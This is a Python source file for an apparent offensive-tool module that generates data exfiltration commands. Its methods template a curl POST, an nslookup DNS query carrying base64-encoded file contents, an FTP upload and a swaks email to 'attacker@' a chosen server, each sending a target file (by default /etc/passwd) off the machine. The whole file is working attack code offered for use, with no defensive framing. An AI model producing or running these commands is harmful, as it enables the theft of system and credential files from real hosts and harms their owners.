"""Data Exfiltration Payload Generator"""

class PayloadGenerator:
    """Generate data exfiltration payloads"""
    
    def __init__(self):
        self.name = 'data_exfiltration'
        self.description = 'Generate payloads for data exfiltration'
        self.methods = ['http', 'dns', 'ftp', 'smtp']
    
    def generate(self, options):
        """Generate exfiltration payload"""
        exfil_server = options.get('EXFIL_SERVER')
        method = options.get('METHOD', 'http')
        target_path = options.get('TARGET_PATH', '/etc/passwd')
        
        payload = self._create_exfiltration_script(method, exfil_server, target_path)
        
        return {
            'payload': payload,
            'method': method,
            'target': target_path,
            'server': exfil_server
        }
    
    def _create_exfiltration_script(self, method, server, path):
        """Create exfiltration script"""
        if method == 'http':
            return f"""curl -X POST -d @{path} http://{server}/exfil"""
        elif method == 'dns':
            return f"""nslookup $(cat {path} | base64) {server}"""
        elif method == 'ftp':
            return f"""ftp -s:ftp.txt {server}"""
        elif method == 'smtp':
            return f"""swaks -t attacker@{server} -f data@localhost -b @{path}"""
        else:
            return "Unknown method"